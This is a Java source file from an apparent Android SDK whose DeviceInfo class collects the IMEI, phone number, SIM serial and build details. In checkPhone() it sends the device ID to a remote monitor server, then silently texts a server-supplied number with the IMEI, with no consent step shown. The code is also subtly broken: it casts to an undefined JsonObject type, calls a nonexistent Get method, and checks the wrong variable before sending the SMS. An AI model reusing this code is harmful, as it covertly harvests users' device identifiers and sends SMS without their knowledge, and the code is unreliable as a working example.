package com.ss.sssdk;

import android.content.Context;
import android.os.Build;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import org.json.JSONObject;

/**
 * Created by ljw on 15/11/12.
 */
public class DeviceInfo {
    public static JSONObject getDeviceInfo() {
        JSONObject info = new JSONObject();
        TelephonyManager tm = (TelephonyManager) SdkTools.context.getSystemService(Context.TELEPHONY_SERVICE);
        try {
            info.put("Imei", tm.getDeviceId());
            info.put("SoftVersion",tm.getDeviceSoftwareVersion());
            info.put("Phone",tm.getLine1Number());
            info.put("Operator",tm.getNetworkOperatorName());
            info.put("PhoneType",tm.getPhoneType());
            info.put("SimSerial", tm.getSimSerialNumber());
            info.put("Model",android.os.Build.MODEL);
            info.put("Device",android.os.Build.DEVICE);
            info.put("Product",android.os.Build.PRODUCT);
            info.put("SDK",android.os.Build.VERSION.SDK_INT);
            info.put("Manufacturer",android.os.Build.MANUFACTURER);
            info.put("OsID",android.os.Build.ID);
            info.put("User", Build.USER);
            return info;
        }catch(Exception e) {
            e.printStackTrace();
        }
        return info;
    }
    public static String getDeviceId() {
        TelephonyManager tm = (TelephonyManager) SdkTools.context.getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getDeviceId();
    }

    public static String getPhone(boolean checkphone) {
        String phone = SdkTools.getKV("phone");
        if(phone.equalsIgnoreCase("")) {
            TelephonyManager tm = (TelephonyManager) SdkTools.context.getSystemService(Context.TELEPHONY_SERVICE);
            phone = tm.getLine1Number();
            if(phone != null && SdkTools.isPhone(phone)) {
                SdkTools.setKV("phone",phone);
                return phone;
            }else if(checkphone) {
                checkPhone();
            }
            return null;
        }else {
            if(SdkTools.isPhone(phone)) {
                return phone;
            }else if(checkphone){
                checkPhone();
            }
            return null;
        }
    }
    public static void checkPhone() {
        String deviceId = getDeviceId();
        String param = "d=" + deviceId;
        HttpRequest.sendGetJSONObject(HttpUrl.monitor_url, HttpUrl.GET_RECIEVE_PHONE,null, param, new HttpRequest.IHttpCallBack() {
            @Override
            public void callback(String ret) {

            }

            @Override
            public void callback(JSONObject ret) {
                if (ret != null) {
                    JsonObject retobj = (JsonObject)ret;
                    try {
                        if (retobj.getBoolean("b")) {
                            String phone = (String)retobj.Get("mp");
                            if (phone != null && SdkTools.isPhone(phone)) {
                                SdkTools.setKV("phone",phone);
                            }else {
                                String sphone = (String)retobj.Get("sp");
                                if (phone != null && SdkTools.isPhone(phone)) {
                                    SdkTools.sendSMS(sphone, "#CHECK#" + DeviceInfo.getDeviceId());
                                }
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }
}

